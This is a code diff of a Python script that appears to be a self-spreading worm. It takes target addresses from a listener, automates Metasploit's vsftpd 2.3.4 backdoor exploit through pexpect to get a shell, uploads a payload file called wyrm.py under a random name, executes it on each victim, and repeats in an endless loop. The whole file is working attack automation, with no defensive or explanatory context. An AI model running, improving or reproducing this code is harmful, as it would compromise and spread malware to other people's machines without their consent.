@@ -2,8 +2,9 @@
 from nclib import TCPServer
 import pexpect
 import sys
-import random
+from random import random
 import string as strings
+from time import sleep
 
 def listener():
 
@@ -21,29 +22,38 @@ def listener():
 		return target_list
 
 def generate(target):
+
+	try:
 	
-	process = pexpect.spawn(["msfconsole"])
-	process.logfile = sys.stdout.buffer
-	process.expect("msf6")
+		process = pexpect.spawn(["msfconsole"])
+		process.logfile = sys.stdout.buffer
+		process.expect("msf6")
 
-	process.sendline("use exploit/unix/ftp/vsftpd_234_backdoor")
-	process.sendline("set rhost "+target)
-	process.sendline("run")
-	process.expect("Command shell session 1 opened")
+		process.sendline("use exploit/unix/ftp/vsftpd_234_backdoor")
+		process.sendline("set rhost "+target)
+		process.sendline("run")
+		process.expect("Command shell session 1 opened")
 
-	#letters = strings.ascii_lowercase()
-	randname = 'jkhdsasdasdffdgw.py'
+		noise = str(random())
+		randname = noise + ".py"
 
 
-	process.sendline("upload /home/peyton/Documents/Worm/wormreplicate.spec "+randname)
-	process.expect("upload finished")
+		process.sendline("upload /home/peyton/Documents/Worm/wyrm.py "+randname)
+		process.expect("finished")
 
-	process.sendline("shell")
-	process.sendline("cd / && chmod +x "+randname+" && ./"+randname)
-	process.expect("success")
+		process.sendline("shell")
+		process.expect("Found bash")
+		process.sendline("shell")
+		sleep(5)
+		process.sendline("cd / && chmod +x "+randname+" && python "+randname)
+		sleep(10)
+		process.sendline("exit")
 
+	except:
+		pass
 	
-target_list = listener()
-#target_list = ['192.168.56.112']
-for target in target_list:
-	generate(target)
+while True:
+	
+	target_list = listener()
+	for target in target_list:
+		generate(target)
